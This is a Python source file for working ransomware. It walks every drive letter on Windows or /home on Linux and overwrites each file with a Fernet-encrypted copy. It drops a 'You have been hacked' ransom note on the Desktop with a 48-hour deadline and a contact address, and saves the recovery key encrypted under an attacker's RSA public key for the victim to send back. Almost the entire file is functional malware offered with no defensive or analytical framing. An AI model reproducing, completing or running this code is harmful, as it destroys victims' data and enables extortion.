from base64 import b64decode
from os import getcwd, path, scandir
from cryptography.fernet import Fernet
import platform
from string import ascii_uppercase
import webbrowser
import os
import pathlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

key = Fernet.generate_key()  # Creates fernet key.
crypter = Fernet(key)


class Ransomware:

    def __init__(self, directory: str = getcwd()):

        self.directory = directory

    def launch(self):
        self.encrypt_system(self.directory)  # Launches the encryption function.

    def encrypt_system(self, directory: str) -> None:

        for file in scandir(directory):
            complete_name = path.join(directory, file.name)  # Scans directory and gets exact file locations.

            if file.is_dir():  # If path is a folder scans folder and encrypts files. If it is not passes.
                try:
                    self.encrypt_system(complete_name)
                except Exception:
                    pass
            elif file.is_file():  # If path is a file encrypts the file.
                try:
                    with open(complete_name, 'rb') as f:
                        tempfile = f.read()
                    _tempfile = crypter.encrypt(tempfile)
                    with open(complete_name, 'wb') as f:
                        f.write(_tempfile)

                except Exception:
                    pass


def ransom_note():  # Ransom note is created and saved on Desktop folder.
    save_path = pathlib.Path.home() / 'Desktop'
    file_name = 'readme.html'
    complete_name = os.path.join(save_path, file_name)
    with open(complete_name, 'w') as n:
        n.write("""
        You have been hacked!
        All of your files are now encrypted
        with military grade algorithm.
        You have 48 hours to recover your files. 
        To recover your files you have to send us
        an email with send_me_back.txt(located on your desktop) attached. 
        Then we can negotiate the ransom for your files.
        Our email adress is ransomgang@protonmail.ch
        We warn you about do not try to recover your files with another firm. 
        If you do that you will lose your files forever.
        Do not underestimate us.


        RANSOM GANG
        """)
        webbrowser.open(complete_name)


def send_me_back():
    pubkey = "INSERT PUBLIC KEY HERE"  # Attacker's public key is inserted here.
    decoded_pubkey = b64decode(pubkey)  # Public key is decoded before imported.
    impkey = RSA.import_key(decoded_pubkey)  # Public key is imported.
    cipher = PKCS1_OAEP.new(impkey)  # The cipher in which the public key is used is defined.
    save_path = pathlib.Path.home() / 'Desktop'
    file_name = 'send_me_back.txt'
    complete_name = os.path.join(save_path, file_name)
    with open(complete_name, 'wb') as n:
        n.write(cipher.encrypt(key))  # The recovery key is encrypted with the public key and saved on the desktop.


def main() -> None:
    # Finds out the OS and defines the directory.
    if platform.system() == "Windows":
        for maj in ascii_uppercase:
            directory = f"{maj}:\\"

            try:
                Ransomware(
                    directory=directory or getcwd()
                ).launch()
            except Exception:
                pass

        exit(0)
    elif platform.system() == "Linux":
        Ransomware(
            directory="/home"
        ).launch()
        exit(0)

    else:
        exit(0)

#  Launches functions


ransom_note()
send_me_back()

if __name__ == "__main__":
    main()
